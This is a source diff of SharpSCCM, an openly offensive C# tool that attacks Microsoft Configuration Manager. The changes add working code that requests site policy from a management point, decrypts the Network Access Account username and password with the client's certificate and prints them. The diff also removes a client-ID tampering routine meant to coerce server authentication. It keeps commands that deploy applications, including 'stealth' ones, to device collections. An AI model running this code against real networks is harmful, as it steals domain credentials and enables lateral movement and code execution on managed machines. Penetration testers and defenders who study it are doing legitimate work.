@@ -1,13 +1,14 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.CommandLine;
-using System.CommandLine.Invocation;
+using System.CommandLine.Builder;
+using System.CommandLine.Parsing;
+using System.CommandLine.NamingConventionBinder;
 using System.Linq;
 using System.Management;
 using System.Reflection;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
-using System.Text;
 using System.Xml;
 
 // Configuration Manager SDK
@@ -19,28 +20,8 @@ using Microsoft.ConfigurationManagement.Messaging.Sender.Http;
 
 namespace SharpSCCM
 {
-    static class Program
+     static class Program
     {
-        static ManagementScope NewSccmConnection(string path)
-        {
-            ConnectionOptions connection = new ConnectionOptions();
-            ManagementScope sccmConnection = new ManagementScope(path, connection);
-            try
-            {
-                Console.WriteLine($"[+] Connecting to {sccmConnection.Path}");
-                sccmConnection.Connect();
-            }
-            catch (System.UnauthorizedAccessException unauthorizedErr)
-            {
-                Console.WriteLine("[!] Access to WMI was not authorized (user name or password might be incorrect): " + unauthorizedErr.Message);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine("[!] Error connecting to WMI: " + e.Message);
-            }
-            return sccmConnection;
-        }
-
         // Functions that interact with a site server
 
         static void AddDeviceToCollection(ManagementScope scope, string deviceName, string collectionName)
@@ -77,20 +58,6 @@ namespace SharpSCCM
             GetCollectionMember(scope, collectionName, false, null, null, false, false);
         }
 
-        static void InvokeUpdate(ManagementScope scope, string collectionName)
-        {
-            Console.WriteLine($"[+] Forcing all members of {collectionName} to check for updates and execute any new applications available");
-            ManagementClass clientOperation = new ManagementClass(scope, new ManagementPath("SMS_ClientOperation"), null);
-            ManagementBaseObject initiateClientOpParams = clientOperation.GetMethodParameters("InitiateClientOperation");
-            initiateClientOpParams.SetPropertyValue("Type", 8); // RequestPolicyNow
-
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
-            foreach (ManagementObject collection in searcher.Get())
-            {
-                initiateClientOpParams["TargetCollectionID"] = collection.GetPropertyValue("CollectionID");
-            }
-            clientOperation.InvokeMethod("InitiateClientOperation", initiateClientOpParams, null);
-        }
 
         static void GetCollectionMember(ManagementScope scope, string name, bool count, string[] properties, string orderBy, bool dryRun, bool verbose)
         {
@@ -112,15 +79,19 @@ namespace SharpSCCM
 
         static void GetNetworkAccessAccounts(string server, string sitecode)
         {
+
+
             // HTTP sender is used for sending messages to the MP
             HttpSender sender = new HttpSender();
 
             // Get certificates from local machine
             MessageCertificateX509 signingCertificate = GetSigningCertificate();
             MessageCertificateX509 encryptionCertificate = GetEncryptionCertificate();
+            //MessageCertificateX509 certificate = CreateUserCertificate();
 
-            Console.WriteLine(signingCertificate.X509Certificate.FriendlyName);
-            //MessageCertificateX509 certificate = CreateCertificate();
+            // Register a new client. Using existing client does not work, likely because the certificate does not match what the server expects
+            //SmsClientId clientId = RegisterClient(certificate, null, server, sitecode);
+            //SendDDR(certificate, null, server, sitecode, clientId);
 
             // Send request for policy assignments to obtain policy locations
             ConfigMgrPolicyAssignmentRequest assignmentRequest = new ConfigMgrPolicyAssignmentRequest();
@@ -128,9 +99,8 @@ namespace SharpSCCM
             // Add our certificate for message signing and encryption
             assignmentRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
             assignmentRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
+            //assignmentRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
 
-            // Register a new client. Using existing client does not work, likely because the certificate does not match what the server expects
-            //SmsClientId clientId = RegisterClient(certificate, null, server, sitecode);
             SmsClientId clientId = GetSmsId();
             assignmentRequest.SmsId = clientId;
             assignmentRequest.Settings.HostName = server;
@@ -149,6 +119,7 @@ namespace SharpSCCM
             // Add our certificate for message signing and encryption
             policyDownloadRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
             policyDownloadRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
+            //policyDownloadRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
 
             // Discover local properties
             policyDownloadRequest.Discover();
@@ -160,16 +131,44 @@ namespace SharpSCCM
             policyDownloadRequest.SiteCode = sitecode;
             policyDownloadRequest.SerializeMessageBody();
             Console.WriteLine($"[+] Sending policy download request to {policyDownloadRequest.Settings.HostName}:{policyDownloadRequest.SiteCode}");
-            Console.WriteLine($"[+] Policy request body:\n{System.Xml.Linq.XElement.Parse("<root>" + policyDownloadRequest.Body + "</root>")}");
-            foreach (var attachment in policyDownloadRequest.Attachments)
-            {
-                Console.WriteLine(attachment.Body);
-            }
+            //Console.WriteLine($"[+] Policy request body:\n{System.Xml.Linq.XElement.Parse("<root>" + policyDownloadRequest.Body + "</root>")}");
+            //foreach (var attachment in policyDownloadRequest.Attachments)
+            //{
+            //    Console.WriteLine(attachment.Body);
+            //}
             ConfigMgrPolicyBodyDownloadReply policyDownloadReply = policyDownloadRequest.SendMessage(sender);
-            Console.WriteLine($"\n[+] Policy download reply body:\n{policyDownloadReply.ReplyPolicyBodies}");
+            Console.WriteLine("\n[+] Policy download reply body:\n");
             foreach (PolicyBody policyBody in policyDownloadReply.ReplyPolicyBodies)
             {
-                Console.WriteLine(policyBody.RawPolicyText);
+                //Console.WriteLine(policyBody.RawPolicyText);
+                if (policyBody.RawPolicyText.Contains("NetworkAccess"))
+                {
+                    XmlDocument policyXmlDoc = new XmlDocument();
+                    policyXmlDoc.LoadXml(policyBody.RawPolicyText.Trim().Remove(0, 1));
+                    string encryptedUsername = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.InnerText;
+                    string encryptedPassword = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.NextSibling.InnerText;
+                    Console.WriteLine($"\n[+] Encrypted NetworkAccessUsername: {encryptedUsername}");
+                    Console.WriteLine($"\n[+] Encrypted NetworkAccessPassword: {encryptedPassword}");
+                    /*
+                    // Request MP certificates
+                    ConfigMgrMPCertRequest certRequest = new ConfigMgrMPCertRequest();
+                    certRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
+                    certRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
+                    certRequest.SmsId = clientId;
+                    certRequest.Settings.HostName = server;
+                    certRequest.Settings.Compression = MessageCompression.Zlib;
+                    certRequest.Settings.ReplyCompression = MessageCompression.Zlib;
+                    certRequest.SiteCode = sitecode;
+                    certRequest.SerializeMessageBody();
+                    Console.WriteLine($"\n[+] Requesting management point certificate for data decryption");
+                    ConfigMgrMPCertReply certReply = certRequest.SendMessage(sender);
+                    Console.WriteLine(certReply.MPCertificate.Certificate.PublicKey);
+                    MessageCertificateX509Volatile certReplyCert = new MessageCertificateX509Volatile(certReply.MPCertificate.Certificate);
+                    */
+                    Console.WriteLine($"\n[+] Decrypted NetworkAccessUsername: {ByteArrayToString(encryptionCertificate.Decrypt(StringToByteArray(encryptedUsername)))}");
+                    Console.WriteLine($"\n[+] Decrypted NetworkAccessPassword: {ByteArrayToString(encryptionCertificate.Decrypt(StringToByteArray(encryptedPassword)))}");
+                    //Console.WriteLine($"\n[+] Decrypted NetworkAccessUsername: {ByteArrayToString(certificate.Decrypt(StringToByteArray(encryptedUsername)))}");
+                }
             }
         }
 
@@ -184,6 +183,21 @@ namespace SharpSCCM
             }
             Console.WriteLine($"[+] Obtained SmsId from local host: {SmsId}");
             return new SmsClientId(SmsId);
+        }
+
+        static void InvokeUpdate(ManagementScope scope, string collectionName)
+        {
+            Console.WriteLine($"[+] Forcing all members of {collectionName} to check for updates and execute any new applications available");
+            ManagementClass clientOperation = new ManagementClass(scope, new ManagementPath("SMS_ClientOperation"), null);
+            ManagementBaseObject initiateClientOpParams = clientOperation.GetMethodParameters("InitiateClientOperation");
+            initiateClientOpParams.SetPropertyValue("Type", 8); // RequestPolicyNow
+
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collectionName}'"));
+            foreach (ManagementObject collection in searcher.Get())
+            {
+                initiateClientOpParams["TargetCollectionID"] = collection.GetPropertyValue("CollectionID");
+            }
+            clientOperation.InvokeMethod("InitiateClientOperation", initiateClientOpParams, null);
         }
 
         static void LocalNetworkAccessAccounts()
@@ -219,38 +233,6 @@ namespace SharpSCCM
             {
                 Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount");
             }
-        }
-
-        static void LocalCoerceAuthSMB()
-        {
-            ManagementScope scope = NewSccmConnection("\\\\localhost\\root\\ccm");
-            Console.WriteLine("[+] Overwriting Configuration Manager Unique Identifier to create new resource");
-            GetClassInstances(scope, "CCM_Client");
-            string query = "SELECT * FROM CCM_Client";
-            ObjectQuery objQuery = new ObjectQuery(query);
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, objQuery);
-            foreach (ManagementObject queryObj in searcher.Get())
-            {
-                //queryObj["ClientId"] = "GUID:9478CCB3-8148-4E1E-BE34-2BDB4DA5FABA";
-                queryObj["ClientId"] = "GUID:9478CCB3-8148-4E1E-BE34-2BDB4DA5FABA";
-                queryObj["PreviousClientId"] = "Unknown";
-                queryObj["ClientIdChangeDate"] = "11/06/2021 20:36:57";
-                queryObj.Put();
-            }
-            GetClassInstances(scope, "CCM_Client");
-
-            // Things to change
-            // SCCM Device Property: What it maps to
-            // Resource Names: HKLM/SYSTEM/CurrentControlSet/Services/TcpIp/Parameters/HostName 
-            // IP Address: Powermad? Registry? Both?
-            // Configuration Manager Unique Identifier:  
-
-            // Force an early Data Discovery Record from the client to the server
-            Console.WriteLine("[+] Triggering an out of schedule update from client to server");
-            ManagementClass client = new ManagementClass(scope, new ManagementPath("SMS_Client"), null);
-            ManagementBaseObject triggerScheduleParams = client.GetMethodParameters("TriggerSchedule");
-            triggerScheduleParams.SetPropertyValue("sScheduleID", "{00000000-0000-0000-0000-000000000003}"); // Discovery Data Collection Cycle
-            client.InvokeMethod("TriggerSchedule", triggerScheduleParams, null);
         }
 
         static void NewApplication(ManagementScope scope, string name, string path, bool runAsUser = false, bool stealth = false)
@@ -519,6 +501,26 @@ namespace SharpSCCM
             }
         }
 
+        static ManagementScope NewSccmConnection(string path)
+        {
+            ConnectionOptions connection = new ConnectionOptions();
+            ManagementScope sccmConnection = new ManagementScope(path, connection);
+            try
+            {
+                Console.WriteLine($"[+] Connecting to {sccmConnection.Path}");
+                sccmConnection.Connect();
+            }
+            catch (System.UnauthorizedAccessException unauthorizedErr)
+            {
+                Console.WriteLine("[!] Access to WMI was not authorized (user name or password might be incorrect): " + unauthorizedErr.Message);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] Error connecting to WMI: " + e.Message);
+            }
+            return sccmConnection;
+        }
+
         static void RemoveApplication(ManagementScope scope, string applicationName)
         {
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{applicationName}'"));
@@ -762,7 +764,7 @@ namespace SharpSCCM
             }
         }
 
-        public static byte[] StringToByteArray(String hex)
+        public static byte[] StringToByteArray(string hex)
         {
             int NumberChars = hex.Length;
             byte[] bytes = new byte[NumberChars / 2];
@@ -773,10 +775,7 @@ namespace SharpSCCM
 
         public static string ByteArrayToString(byte[] ba)
         {
-            StringBuilder hex = new StringBuilder(ba.Length * 2);
-            foreach (byte b in ba)
-                hex.AppendFormat("{0:x2}", b);
-            return hex.ToString();
+            return BitConverter.ToString(ba).Replace("-", "");
         }
 
         // Messaging SDK Functions
@@ -791,14 +790,6 @@ namespace SharpSCCM
         {
             // Get signing certificate used by the legitimate client
             MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
-            return certificate;
-        }
-
-        static MessageCertificateX509 CreateCertificate()
-        {
-            // Generate certificate for signing and encrypting messages
-            string[] oidPurposes = new string[] { "2.5.29.37" }; // Any extended key usage
-            MessageCertificateX509 certificate = MessageCertificateX509.CreateSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", oidPurposes, DateTime.Now, DateTime.Now.AddMonths(6));
             return certificate;
         }
 
@@ -1209,46 +1200,6 @@ namespace SharpSCCM
             var localCommand = new Command("local", "A group of commands to interact with the local workstation/server");
             rootCommand.Add(localCommand);
 
-            // local clientinfo
-            var getLocalClientInfo = new Command("clientinfo", "Get the primary Management Point and Site Code for the local host");
-            localCommand.Add(getLocalClientInfo);
-            getLocalClientInfo.Handler = CommandHandler.Create(
-                () =>
-                {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
-                    GetClassInstances(sccmConnection, "CCM_InstalledComponent", false, new[] { "Version" }, "Name='SmsClient'");
-                });
-
-            // local naa
-            var getLocalNetworkAccessAccounts = new Command("naa", "Get any network access accounts for the site");
-            localCommand.Add(getLocalNetworkAccessAccounts);
-            getLocalNetworkAccessAccounts.Handler = CommandHandler.Create(
-                () =>
-                {
-                    LocalNetworkAccessAccounts();
-                });
-
-            // local siteinfo
-            var localSiteInfo = new Command("siteinfo", "Get the primary Management Point and Site Code for the local host");
-            localCommand.Add(localSiteInfo);
-            localSiteInfo.Handler = CommandHandler.Create(
-                () =>
-                {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
-                    GetClassInstances(sccmConnection, "SMS_Authority", false, new[] { "CurrentManagementPoint", "Name" });
-                });
-
-            // local classes
-            var localClasses = new Command("classes", "Get information on local WMI classes");
-            localCommand.Add(localClasses);
-            localClasses.Add(new Argument<string>("wmiPath", "The WMI path to query (e.g., \"root\\ccm\")"));
-            localClasses.Handler = CommandHandler.Create(
-                (string wmiPath, bool count, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
-                {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\" + wmiPath);
-                    GetClasses(sccmConnection);
-                });
-
             // local class-instances
             var localClassInstances = new Command("class-instances", "Get information on local WMI class instances");
             localCommand.Add(localClassInstances);
@@ -1276,16 +1227,44 @@ namespace SharpSCCM
                     GetClassProperties(classInstance);
                 });
 
-            // local coerce-auth
-            var localCoerceAuthSMB = new Command("coerce-auth", "Manipulate the client version to appear lower than the server's requirement, causing the server to authenticate while trying and reinstall the agent after the next heartbeat. This function requires local administrator privileges and only works when client push is enabled.");
-            localCommand.Add(localCoerceAuthSMB);
-            localCoerceAuthSMB.Handler = CommandHandler.Create(
-                () =>
+            // local clientinfo
+            var getLocalClientInfo = new Command("clientinfo", "Get the primary Management Point and Site Code for the local host");
+            localCommand.Add(getLocalClientInfo);
+            getLocalClientInfo.Handler = CommandHandler.Create(
+                new Action(() =>
                 {
-                    //ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm\\Policy\\machine\\actualconfig");
-                    //ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm\\StateMsg");
-                    //LocalCoerceAuthSMB(sccmConnection);
-                    LocalCoerceAuthSMB();
+                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
+                    GetClassInstances(sccmConnection, "CCM_InstalledComponent", false, new[] { "Version" }, "Name='SmsClient'");
+                }));
+
+            // local naa
+            var getLocalNetworkAccessAccounts = new Command("naa", "Get any network access accounts for the site");
+            localCommand.Add(getLocalNetworkAccessAccounts);
+            getLocalNetworkAccessAccounts.Handler = CommandHandler.Create(
+                new Action(() =>
+                {
+                    LocalNetworkAccessAccounts();
+                }));
+
+            // local siteinfo
+            var localSiteInfo = new Command("siteinfo", "Get the primary Management Point and Site Code for the local host");
+            localCommand.Add(localSiteInfo);
+            localSiteInfo.Handler = CommandHandler.Create(
+                new Action(() =>
+                {
+                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
+                    GetClassInstances(sccmConnection, "SMS_Authority", false, new[] { "CurrentManagementPoint", "Name" });
+                }));
+
+            // local classes
+            var localClasses = new Command("classes", "Get information on local WMI classes");
+            localCommand.Add(localClasses);
+            localClasses.Add(new Argument<string>("wmiPath", "The WMI path to query (e.g., \"root\\ccm\")"));
+            localClasses.Handler = CommandHandler.Create(
+                (string wmiPath, bool count, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
+                {
+                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\" + wmiPath);
+                    GetClasses(sccmConnection);
                 });
 
             // new
@@ -1306,18 +1285,6 @@ namespace SharpSCCM
                     NewApplication(sccmConnection, name, path, runAsUser, stealth);
                 });
 
-            // new deployment
-            var newDeployment = new Command("deployment", "Create an assignment to deploy an application to a collection");
-            newCommand.Add(newDeployment);
-            newDeployment.Add(new Argument<string>("application", "The name of the application you would like to deploy"));
-            newDeployment.Add(new Argument<string>("collection", "The name of the collection you would like to deploy the application to"));
-            newDeployment.Handler = CommandHandler.Create(
-                (string server, string sitecode, string name, string application, string collection) =>
-                {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    NewDeployment(sccmConnection, application, collection);
-                });
-
             // new collection
             var newCollection = new Command("collection", "Create a collection of devices or users");
             newCommand.Add(newCollection);
@@ -1329,6 +1296,18 @@ namespace SharpSCCM
                 {
                     ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     NewCollection(sccmConnection, collectionType, collectionName);
+                });
+
+            // new deployment
+            var newDeployment = new Command("deployment", "Create an assignment to deploy an application to a collection");
+            newCommand.Add(newDeployment);
+            newDeployment.Add(new Argument<string>("application", "The name of the application you would like to deploy"));
+            newDeployment.Add(new Argument<string>("collection", "The name of the collection you would like to deploy the application to"));
+            newDeployment.Handler = CommandHandler.Create(
+                (string server, string sitecode, string name, string application, string collection) =>
+                {
+                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    NewDeployment(sccmConnection, application, collection);
                 });
 
             // remove
@@ -1370,7 +1349,9 @@ namespace SharpSCCM
                 });
 
             // Execute
-            rootCommand.Invoke(args);
+            var commandLine = new CommandLineBuilder(rootCommand).UseDefaults().Build();
+            commandLine.Invoke(args);
+            //rootCommand.Invoke(args);
         }
     }
 }
